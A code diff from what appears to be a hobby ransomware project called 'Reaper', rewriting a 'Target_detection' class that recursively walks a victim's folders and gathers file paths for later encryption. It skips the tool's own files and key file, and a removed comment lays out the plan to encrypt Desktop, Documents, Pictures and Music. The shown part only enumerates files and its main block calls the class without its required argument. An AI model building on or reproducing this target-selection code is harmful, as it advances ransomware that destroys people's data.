@@ -1,40 +1,41 @@
 import os
-from Victim import Victim
-import subprocess
+
 
 class Target_detection:
-    def __init__(self):
-        self.victim_machine = Victim()
-        self.target_path = self.victim_machine.get_target_dir()
+    def __init__(self, victim):
+        # self.target_path = victim.get_target_dir()
+        self.target_path = r"C:\Users\Shalin\Documents\3_Python\Python_projects\Reaper\test files"
         self.targets = []
 
-    def gather_targets_linux(self):
-        # Execute 'whoami' to get the user
-        # cd into that user's directory inside 'home'
-        # Proceed to encrypt files in any of the directories:
-        # Desktop
-        # Documents
-        # Pictures
-        # Music
-        pass
+    def gather_targets_windows(self, target_path=None):
+        folders = []
 
-    def gather_targets_windows(self, target_path):
-        pass
+        if target_path is None:
+            target_path = self.target_path
 
-    def gather_targets(self):
-            for file in os.scandir(self.target_path):
-                name = file.path.split("\\")[-1]
+        try:
+            for item in os.scandir(target_path):
+                name = item.path.split("\\")[-1]
 
-                if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
-                    continue
-
-                if file.is_dir():
-                    if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
+                if os.path.isdir(item.path):
+                    if name == "My Music" or name == "My Videos" or name == "My Pictures" or name == ".git" or \
+                            name == "Reaper":
                         continue
-                    self.gather_targets(file)
-
+                    else:
+                        folders.append(item)
                 else:
-                    self.targets.append(file.path)
+                    self.targets.append(item.path)
 
-tr = Target_detection()
-tr.gather_targets_windows(tr.target_path)
+            for item in folders:
+                self.gather_targets_windows(item.path)
+        except PermissionError:
+            print("Failed to access due to permission error...")
+
+        return self.targets
+
+
+if __name__ == '__main__':
+    tr = Target_detection()
+    # tr.gather_targets_windows()
+    # print(tr.target_path)
+    # print(tr.targets)
